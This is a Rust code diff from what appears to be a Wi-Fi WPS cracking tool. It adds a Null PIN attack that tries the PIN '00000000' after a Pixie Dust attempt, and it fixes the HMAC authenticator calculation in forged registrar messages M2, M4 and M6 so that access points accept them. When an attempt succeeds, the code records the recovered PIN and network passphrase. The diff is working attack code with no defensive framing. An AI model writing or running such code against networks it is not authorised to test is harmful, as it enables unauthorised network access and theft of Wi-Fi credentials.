@@ -205,6 +205,8 @@ pub enum WpsPhase {
     BruteForcePhase2,
     /// Waiting during lockout delay.
     LockoutWait,
+    /// Trying Null PIN (00000000).
+    NullPin,
     /// Attack completed.
     Done,
 }
@@ -438,6 +440,8 @@ pub enum WpsEventKind {
     PixieCrackSuccess { pin: String, elapsed_ms: u64 },
     /// Pixie Dust couldn't crack (data saved for export).
     PixieCrackFailed,
+    /// Null PIN attempt failed.
+    NullPinFailed,
     /// Brute force Phase 1 started (first 4 digits).
     BruteForcePhase1Started { total: u32 },
     /// Brute force Phase 2 started (last 3+checksum digits).
@@ -639,24 +643,30 @@ impl WpsSession {
         };
         let mut body = build_m2(&m2_params);
 
-        // Compute and patch Authenticator: HMAC(AuthKey, M1_body || M2_up_to_auth_value)
-        let auth_val_offset = Self::find_auth_value_offset(&body)?;
-        let authenticator = compute_wps_authenticator(&self.authkey, &self.last_msg_body, &body[..auth_val_offset])?;
-        patch_authenticator(&mut body, &authenticator);
+        // Compute and patch Authenticator: HMAC(AuthKey, M1_body || M2_without_auth_TLV)
+        // Per WPS spec: hash over M_prev || M_curr EXCLUDING the entire Authenticator TLV
+        // (both header and value). Reaver/wpa_supplicant build the message without auth,
+        // compute HMAC, then append. We build with placeholder then patch, so we must
+        // exclude the auth TLV header (4 bytes) from the HMAC input.
+        let (auth_tlv_offset, auth_val_offset) = Self::find_auth_offsets(&body)?;
+        let authenticator = compute_wps_authenticator(&self.authkey, &self.last_msg_body, &body[..auth_tlv_offset])?;
+        patch_authenticator_at(&mut body, auth_val_offset, &authenticator);
 
         Some(body)
     }
 
-    /// Find the offset of the Authenticator VALUE within a WPS TLV body.
-    /// Returns the byte offset where the 8-byte authenticator value starts.
-    fn find_auth_value_offset(body: &[u8]) -> Option<usize> {
+    /// Find the offsets of the Authenticator TLV within a WPS TLV body.
+    /// Returns (tlv_offset, value_offset) where:
+    ///   - tlv_offset: start of the TLV (type field) — used for HMAC scope
+    ///   - value_offset: start of the 8-byte value — used for patching
+    fn find_auth_offsets(body: &[u8]) -> Option<(usize, usize)> {
         let mut offset = 0;
         while offset + 4 <= body.len() {
             let attr_type = u16::from_be_bytes([body[offset], body[offset + 1]]);
             let length = u16::from_be_bytes([body[offset + 2], body[offset + 3]]) as usize;
             if offset + 4 + length > body.len() { return None; }
             if attr_type == attr::AUTHENTICATOR && length == 8 {
-                return Some(offset + 4); // offset of the VALUE (after type+length)
+                return Some((offset, offset + 4));
             }
             offset += 4 + length;
         }
@@ -694,11 +704,11 @@ impl WpsSession {
 
         let mut body = build_m4(&self.e_nonce, &self.r_hash1, &self.r_hash2, &enc_blob);
 
-        // Compute authenticator: HMAC(AuthKey, prev_msg || current_msg_up_to_auth_value)
-        // Must include authenticator TYPE+LENGTH but not VALUE (matches wpa_supplicant)
-        let auth_val_offset = Self::find_auth_value_offset(&body)?;
-        let authenticator = compute_wps_authenticator(&self.authkey, &self.last_msg_body, &body[..auth_val_offset])?;
-        patch_authenticator(&mut body, &authenticator);
+        // Compute authenticator: HMAC(AuthKey, prev_msg || current_msg_EXCLUDING_auth_TLV)
+        // Per WPS spec: exclude the entire Authenticator TLV (header + value) from HMAC input
+        let (auth_tlv_offset, auth_val_offset) = Self::find_auth_offsets(&body)?;
+        let authenticator = compute_wps_authenticator(&self.authkey, &self.last_msg_body, &body[..auth_tlv_offset])?;
+        patch_authenticator_at(&mut body, auth_val_offset, &authenticator);
 
         Some(body)
     }
@@ -715,9 +725,9 @@ impl WpsSession {
 
         let mut body = build_m6(&self.e_nonce, &enc_blob);
 
-        let auth_val_offset = Self::find_auth_value_offset(&body)?;
-        let authenticator = compute_wps_authenticator(&self.authkey, &self.last_msg_body, &body[..auth_val_offset])?;
-        patch_authenticator(&mut body, &authenticator);
+        let (auth_tlv_offset, auth_val_offset) = Self::find_auth_offsets(&body)?;
+        let authenticator = compute_wps_authenticator(&self.authkey, &self.last_msg_body, &body[..auth_tlv_offset])?;
+        patch_authenticator_at(&mut body, auth_val_offset, &authenticator);
 
         Some(body)
     }
@@ -1114,33 +1124,21 @@ fn run_wps_attack_single(
         WpsAttackType::PixieDust => {
             run_pixie_dust(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
                 target.capability, &target.supported_rates);
+
+            // After Pixie Dust, also try Null PIN if we reached M3 (AP is responsive)
+            let status = info.lock().unwrap_or_else(|e| e.into_inner()).status;
+            if matches!(status, WpsStatus::PixieDataOnly) && running.load(Ordering::SeqCst) {
+                run_null_pin(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
+                    target.capability, &target.supported_rates);
+            }
         }
         WpsAttackType::BruteForce => {
             run_brute_force(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
                 target.capability, &target.supported_rates);
         }
         WpsAttackType::NullPin => {
-            // Null PIN = single brute force attempt with "00000000"
-            session.pin = "00000000".to_string();
-            let result = wps_single_exchange(
-                shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts, 2,
-                target.capability, &target.supported_rates,
-            );
-            match result {
-                ExchangeResult::PinCorrect { psk } => {
-                    set_status(info, WpsStatus::Success);
-                    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
-                    i.pin_found = Some("00000000".to_string());
-                    i.psk_found = Some(psk.clone());
-                    push_event(events, start, WpsEventKind::PinSuccess {
-                        pin: "00000000".to_string(),
-                        psk,
-                    });
-                }
-                _ => {
-                    set_status(info, WpsStatus::PinWrong);
-                }
-            }
+            run_null_pin(shared, reader, bssid, &target.ssid, params, &mut session, info, events, running, start, &tx_opts,
+                target.capability, &target.supported_rates);
         }
     }
 
@@ -1216,6 +1214,63 @@ fn run_pixie_dust(
 
     // Cleanup: send NACK + disassoc
     send_nack(shared, session, &bssid, tx_opts, info, events, start);
+    send_disassoc(shared, bssid, tx_opts, info, events, start);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  Null PIN — single exchange with "00000000"
+// ═══════════════════════════════════════════════════════════════════════════════
+
+fn run_null_pin(
+    shared: &SharedAdapter,
+    reader: &crate::pipeline::PipelineSubscriber,
+    bssid: MacAddress,
+    ssid: &str,
+    params: &WpsParams,
+    session: &mut WpsSession,
+    info: &Arc<Mutex<WpsInfo>>,
+    events: &Arc<EventRing<WpsEvent>>,
+    running: &Arc<AtomicBool>,
+    start: Instant,
+    tx_opts: &TxOptions,
+    ap_capability: u16,
+    ap_rates: &[u8],
+) {
+    session.reset_for_new_attempt();
+    session.pin = "00000000".to_string();
+
+    push_event(events, start, WpsEventKind::PinAttempt {
+        pin: "00000000".to_string(),
+        attempt: 1,
+    });
+    set_phase(info, WpsPhase::NullPin);
+
+    let result = wps_single_exchange(
+        shared, reader, bssid, ssid, params, session, info, events, running, start, tx_opts, 2,
+        ap_capability, ap_rates,
+    );
+
+    match result {
+        ExchangeResult::PinCorrect { psk } => {
+            set_status(info, WpsStatus::Success);
+            let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
+            i.pin_found = Some("00000000".to_string());
+            i.psk_found = Some(psk.clone());
+            push_event(events, start, WpsEventKind::PinSuccess {
+                pin: "00000000".to_string(),
+                psk,
+            });
+        }
+        _ => {
+            push_event(events, start, WpsEventKind::NullPinFailed);
+            // Don't overwrite PixieDataOnly status — preserve that info
+            let current = info.lock().unwrap_or_else(|e| e.into_inner()).status;
+            if !matches!(current, WpsStatus::PixieDataOnly) {
+                set_status(info, WpsStatus::PinWrong);
+            }
+        }
+    }
+
     send_disassoc(shared, bssid, tx_opts, info, events, start);
 }
 
@@ -1775,6 +1830,10 @@ fn wps_single_exchange(
     push_event(events, start, WpsEventKind::MessageSent { msg_type: WpsMessageType::M2 });
 
     // ── Receive M3 from AP (E-Hash1, E-Hash2) ──
+    // Drain stale frames from subscriber queue before waiting for M3.
+    // In single-adapter mode, feed_from can duplicate frames, causing
+    // leftover M1/WSC_Start to be picked up as false M3 matches.
+    reader.drain();
     set_phase(info, WpsPhase::M3Received);
     let eap_data = match wait_for_eap(reader, &bssid, params.eap_timeout, running) {
         Some(data) => { inc_frames_received(info); data }
@@ -1819,6 +1878,7 @@ fn wps_single_exchange(
 
     // ── Receive M5 from AP (encrypted E-S1 — first half correct!) ──
     // If NACK here: first PIN half is WRONG
+    reader.drain();
     set_phase(info, WpsPhase::M5Received);
     let eap_data = match wait_for_eap(reader, &bssid, params.eap_timeout, running) {
         Some(data) => { inc_frames_received(info); data }
@@ -1861,6 +1921,7 @@ fn wps_single_exchange(
 
     // ── Receive M7 from AP (encrypted E-S2 + credentials!) ──
     // If NACK here: second PIN half is WRONG
+    reader.drain();
     set_phase(info, WpsPhase::M7Received);
     let eap_data = match wait_for_eap(reader, &bssid, params.eap_timeout, running) {
         Some(data) => { inc_frames_received(info); data }
@@ -2175,8 +2236,14 @@ fn wait_for_eap(
     }
 
     if let Some(ref mut f) = dbg {
-        let _ = writeln!(f, "=== TIMEOUT: {} frames seen, {} data, {} eapol ===",
-            frame_count, data_count, eapol_count);
+        let elapsed = (Instant::now() - (deadline - timeout)).as_millis();
+        let reason = if !running.load(Ordering::SeqCst) {
+            "STOPPED (running=false)"
+        } else {
+            "TIMEOUT"
+        };
+        let _ = writeln!(f, "=== {}: {} frames seen, {} data, {} eapol, {}ms elapsed ===",
+            reason, frame_count, data_count, eapol_count, elapsed);
     }
     None
 }
